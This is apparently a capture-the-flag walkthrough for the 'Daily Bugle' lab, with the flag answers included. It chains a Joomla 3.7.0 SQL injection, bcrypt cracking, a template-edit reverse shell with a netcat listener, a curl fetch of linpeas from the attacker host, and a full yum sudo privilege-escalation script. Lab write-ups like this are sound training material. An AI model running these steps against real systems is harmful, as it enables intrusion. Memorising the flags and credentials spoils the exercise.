# Daily Bugle - Hard

<details>
<summary>Nmap scan</summary>

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (EdDSA)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
```

</details>
<br>

```shell
nmap -T4 -p- -A 10.10.238.157

nikto -h 10.10.238.157

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.238.157/FUZZ -s

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.238.157/administrator/FUZZ -s

cmseek -u http://10.10.238.157
#to find Joomla version

searchsploit joomla 3.7

python3 joomblah.py http://10.10.238.157

hashcat -m 3200 -a 0 jonahhash.txt /usr/share/wordlists/rockyou.txt

nc -nvlp 4445

#after getting shell
hostname
#daily bugle

#in attacker machine
#in directory with linpeas.sh
python3 -m http.server

#in remote shell
curl http://10.10.252.144:8000/linpeas.sh -o linpeas.sh

chmod +x linpeas.sh

./linpeas.sh > read.txt

head -100 read.txt
#read first 100 lines of file

ssh jjameson@10.10.238.157

#logged into ssh
cat user.txt

#use linpeas.sh to enumerate
#follow linpeas.sh output

sudo -l

which yum

#GTFObins yum sudo exploit

TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

```markdown
We can start with visiting the website at port 80.

Visiting the robots.txt gives us a few paths about the Joomla site.

We can also scan the website directories. The /README.txt gives us the Joomla version.

Alternatively, we can use a tool called CMSeeK.

Upon scanning, we find out that /administrator leads to a login page for Joomla.

Searching for exploits for Joomla 3.7.0 gives us SQLi exploits - we can either use the Python script or sqlmap.

Here, I used the joomblah.py exploit, which gives the user details for 'jonah', including hash.

Identifying the hash online shows that it could be bcrypt $2*$, Blowfish (Unix).

Using hashcat, we crack the password to get 'spiderman123'.

The creds jonah:spiderman123 can be used to login to the /administrator page.

This leads us to a Control Panel for the blogpage, which is using PHP 5.6.40.

We can get reverse shell via Joomla by navigating to Extensions > Templates > Templates. Then, select a template and edit index.php such that it contains the reverse-shell code.

Set up the netcat listener as well.

Once we activate index.php by visiting it or previewing it we will get shell access.

Once we are in remote shell, we can see that we cannot move into jjameson directory as we do not have permissions.

We can use linpeas.sh to check if there are any ways for privilege escalation.

If the output of the script is a lot to read, redirect the output to another file; that file can be read by using 'head' command or sent to another machine using 'scp'.

In the linpeas.sh output, under the Interesting Files section, we get a password 'nv5uz9r3ZEDzVjNu' left in a config PHP file. We can attempt to use this for jjameson login.

And we are able to login as jjameson using the password found earlier.

We can again execute linpeas.sh here and enumerate for privilege escalation.

From the script's output, we can see that we are allowed to run yum as sudo.

We can confirm this by running 'sudo -l'.

To exploit yum, we can use the exploits given on GTFObins.

Following the exploit, we get root access.
```

```markdown
1. Access the web server, who robbed the bank? - Spiderman

2. What is the Joomla version? - 3.7.0

3. What is Jonah's cracked password? - spiderman123

4. What is the user flag? - 27a260fe3cba712cfdedb1c86d80442e

5. What is the root flag? - eec3d53292b1821868266858d7fa6f79
```
